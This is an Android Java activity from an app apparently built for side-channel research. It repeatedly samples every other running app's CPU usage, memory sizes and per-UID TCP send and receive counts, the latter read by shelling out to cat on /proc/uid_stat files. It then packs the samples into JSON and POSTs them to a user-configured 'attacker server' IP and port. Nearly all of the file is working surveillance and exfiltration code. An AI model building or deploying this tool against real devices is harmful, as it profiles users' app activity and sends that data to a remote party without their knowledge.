package com.yinhaoxiao.getallsidechannel;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;


public class MainActivity extends AppCompatActivity {

    private List<ProcessManager.Process> mAllApps;
    private int mNumPunches;
    private int mDelaySec;

    private HashMap<String, ArrayList<Integer>> mCpuHashmap = new HashMap<>();
    private HashMap<String, ArrayList<Long>> mUtimeHashmap = new HashMap<>();
    private HashMap<String, ArrayList<Long>> mStimeHashmap = new HashMap<>();
    private HashMap<String, ArrayList<Long>> mVssHashmap = new HashMap<>();
    private HashMap<String, ArrayList<Long>> mRssHashmap = new HashMap<>();
    private HashMap<String, ArrayList<String>> mTcpsndHashmap = new HashMap<>();
    private HashMap<String, ArrayList<String>> mTcprcvHashmap = new HashMap<>();
    private HashMap<String, ArrayList<Long>> mTimestampHashmap = new HashMap<>();

    private String mAttackerServerIP;
    private int mAttackerServerPort;
    private boolean mCancelThread = false;

    private Button mBeginBtn;
    private Button mStopBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        this.mAllApps = new ArrayList<>();
        mAllApps = ProcessManager.getRunningApps();


        mBeginBtn = (Button) findViewById(R.id.begin_btn);
        mStopBtn = (Button) findViewById(R.id.stop_btn);

        mStopBtn.setEnabled(false);
        mStopBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                mCancelThread = true;
                mBeginBtn.setEnabled(true);
                mStopBtn.setEnabled(false);
            }
        });

        mBeginBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                mNumPunches = Integer.parseInt(((EditText) findViewById(R.id.punchcap_edittext)).getText().toString());
                mAttackerServerIP = ((EditText) findViewById(R.id.attackerip_edittext)).getText().toString();
                mAttackerServerPort = Integer.parseInt(((EditText) findViewById(R.id.attackerport_edittext)).getText().toString());
                mDelaySec = Integer.parseInt(((EditText) findViewById(R.id.delaysec_edittext)).getText().toString());
                
                try {
                    runGetSideChannelThread();
                    mBeginBtn.setEnabled(false);
                    mStopBtn.setEnabled(true);
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
                mCancelThread = false;
            }
        });

    }


    private void getSideChannel() {
        int num_visited_punches = 0;

        while (!mCancelThread) {

//            long start_time = System.currentTimeMillis();
            for (int i = 0; i < mAllApps.size(); i++) {
                ProcessManager.Process app = mAllApps.get(i);

                //skip if it is our own app
                if (app.name.contains(getApplicationContext().getPackageName())) {
                    continue;
                }

                String tcp_snd_str = "";
                String tcp_rcv_str = "";

                try {
                    Runtime r = Runtime.getRuntime();

                    Process process = r.exec("cat /proc/uid_stat/" + Integer.toString(app.uid) + "/tcp_snd");
                    BufferedReader in = new BufferedReader(
                            new InputStreamReader(process.getInputStream()));
                    String line;
                    while ((line = in.readLine()) != null) {
                        tcp_snd_str += line;
                    }

                    process = r.exec("cat /proc/uid_stat/" + Integer.toString(app.uid) + "/tcp_rcv");
                    in = new BufferedReader(
                            new InputStreamReader(process.getInputStream()));
                    line = "";
                    while ((line = in.readLine()) != null) {
                        tcp_rcv_str += line;
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }

                //constructing hashmaps

                if (mCpuHashmap.get(app.name) == null) {
                    mCpuHashmap.put(app.name, new ArrayList<Integer>());
                }
                mCpuHashmap.get(app.name).add(app.cpu);

                if (mUtimeHashmap.get(app.name) == null) {
                    mUtimeHashmap.put(app.name, new ArrayList<Long>());
                }
                mUtimeHashmap.get(app.name).add(app.userTime);

                if (mStimeHashmap.get(app.name) == null) {
                    mStimeHashmap.put(app.name, new ArrayList<Long>());
                }
                mStimeHashmap.get(app.name).add(app.systemTime);

                if (mVssHashmap.get(app.name) == null) {
                    mVssHashmap.put(app.name, new ArrayList<Long>());
                }
                mVssHashmap.get(app.name).add(app.vsize);

                if (mRssHashmap.get(app.name) == null) {
                    mRssHashmap.put(app.name, new ArrayList<Long>());
                }
                mRssHashmap.get(app.name).add(app.rss);

                if (mTcpsndHashmap.get(app.name) == null) {
                    mTcpsndHashmap.put(app.name, new ArrayList<String>());
                }
                mTcpsndHashmap.get(app.name).add(tcp_snd_str);

                if (mTcprcvHashmap.get(app.name) == null) {
                    mTcprcvHashmap.put(app.name, new ArrayList<String>());
                }
                mTcprcvHashmap.get(app.name).add(tcp_rcv_str);

                if (mTimestampHashmap.get(app.name) == null) {
                    mTimestampHashmap.put(app.name, new ArrayList<Long>());
                }
                mTimestampHashmap.get(app.name).add(System.currentTimeMillis());
            }

            num_visited_punches += 1;

            mAllApps = ProcessManager.getRunningApps();

            // Num Cap hit, send and clean all data
            if (num_visited_punches >= this.mNumPunches) {

                try {
                    execSendData();
                } catch (Exception e) {
                    e.printStackTrace();
                }

                mCpuHashmap.clear();
                mUtimeHashmap.clear();
                mStimeHashmap.clear();
                mVssHashmap.clear();
                mRssHashmap.clear();
                mTcpsndHashmap.clear();
                mTcprcvHashmap.clear();
                mTimestampHashmap.clear();
            }

        }

    }

    private void execSendData() throws Exception{
        //make json file
        JSONArray AppInfos = new JSONArray();
        for (String appname : this.mCpuHashmap.keySet()) {
            try {
                JSONObject AppInfo = new JSONObject();
                AppInfo.put("uid", appname);
//                AppInfo.put("app_name", uid.mAppName);
                AppInfo.put("cpu", mCpuHashmap.get(appname));
                AppInfo.put("user_time", mUtimeHashmap.get(appname));
                AppInfo.put("sys_time", mStimeHashmap.get(appname));
                AppInfo.put("vss", mVssHashmap.get(appname));
                AppInfo.put("rss", mRssHashmap.get(appname));
                AppInfo.put("tcp_snd", mTcpsndHashmap.get(appname));
                AppInfo.put("tcp_rcv", mTcprcvHashmap.get(appname));
                AppInfo.put("timestamp", mTimestampHashmap.get(appname));
                AppInfos.put(AppInfo);
            }
            catch (JSONException e) {
                e.printStackTrace();
            }

        }

        URL url = new URL("http://" + mAttackerServerIP + ":" + mAttackerServerPort);
        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
        try {

            urlConnection.setRequestProperty("Content-Type", "application/json");
            urlConnection.setRequestMethod("POST");
            urlConnection.setDoOutput(true);
            urlConnection.setChunkedStreamingMode(0);

            OutputStream out = new BufferedOutputStream(urlConnection.getOutputStream());
            out.write(AppInfos.toString().getBytes());
            out.flush();
        }
        finally {
            urlConnection.disconnect();
        }

    }

    private void runGetSideChannelThread() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(mDelaySec * 1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                getSideChannel();
            }
        }).start();
    }

}
